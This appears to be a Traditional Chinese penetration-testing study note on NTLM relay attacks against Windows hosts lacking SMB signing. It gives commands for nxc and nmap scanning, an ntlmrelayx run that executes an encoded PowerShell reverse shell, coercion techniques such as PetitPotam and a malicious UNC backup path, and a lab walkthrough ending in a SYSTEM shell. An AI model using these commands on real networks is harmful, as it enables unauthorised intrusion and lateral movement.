# 💥 NTLM 中間人轉發攻擊 (ntlm-relay)

本文件說明 Windows/Active Directory 環境中 NTLM Relay (NTLM 轉發) 攻擊的原理、檢測方法與利用技巧。

---

## 🔍 漏洞成因與原理

NTLM Relay (NTLM 中間人轉發) 攻擊主要是利用 Windows 網路環境中 **SMB 簽名 (SMB Signing)** 未被強制啟用的缺陷。

當攻擊者能夠誘使網路中的某台主機或某個服務（以高權限如 SYSTEM 或管理員帳號執行）嘗試連線至攻擊者控制的惡意伺服器（例如透過 SMB/HTTP 存取），該主機會嘗試向攻擊者發起 NTLM 挑戰/響應驗證。
此時，攻擊者如果不嘗試直接破解其雜湊值，而是將這個 NTLM 驗證請求「即時轉發」給域內的另一台目標主機。如果該目標主機**沒有強制啟用 SMB 簽名**，它就會接受該轉發的驗證，從而允許攻擊者以該連線帳戶的權限，在目標主機上執行任意指令（如寫入服務、執行 PowerShell 等）。

---

## 🛠️ 常見利用與繞過技巧

### 1. 偵測禁用 SMB 簽名的主機
在攻擊機上使用 `nxc` 或是 `nmap` 掃描內網中未啟用（或非強制強制）SMB 簽名的主機：
```bash
# 使用 nxc 掃描 (結果中會顯示 signing:False 或 True)
nxc smb <subnet>

# 或者使用 nmap 檢測
nmap -p 445 --script smb-security-mode <subnet>
```

### 2. 啟動 NTLM 轉發監聽器
使用 Impacket 中的 `ntlmrelayx` 啟動 SMB 轉發監聽，並設定目標主機與觸發反彈 Shell 的 payload 命令：
```bash
# -t 指定目標主機，-c 指定要在目標主機上執行的 PowerShell 或 cmd 指令
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
```

### 3. 強迫或誘引目標連線 (Coercion / Triggering)
攻擊者必須誘使目標伺服器發起連線。常見方法包括：
- **Web 應用漏洞利用**：例如在 WordPress 中使用可更改備份路徑的外掛（如 `Backup Migration`），將備份路徑修改為攻擊機的 UNC 路徑：`\\<KALI_IP>\share`。
- **強迫認證協定利用**：利用 `PrinterBug`、`PetitPotam` 或 `ShadowCoerce` 等工具強迫電腦帳戶向攻擊機發起連線。

當目標伺服器與攻擊機進行驗證時，`ntlmrelayx` 會攔截驗證並 Relay 至無 SMB 簽名的目標主機，從而成功反彈 Shell。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Beyond]]（在 internalsrv1 上發現已啟用的 `Backup Migration` 插件，且 `MAILSRV1` 禁用了 SMB 簽名。攻擊者於 Kali 啟動 `ntlmrelayx` 連向 `MAILSRV1` 並執行反彈指令。隨後在 internalsrv1 上設定備份儲存路徑為 `\\192.168.45.243\backup`，觸發 internalsrv1 發起 NTLM 連線，Kali 將其成功轉發至 `MAILSRV1`，取得其 SYSTEM 權限 Shell）。
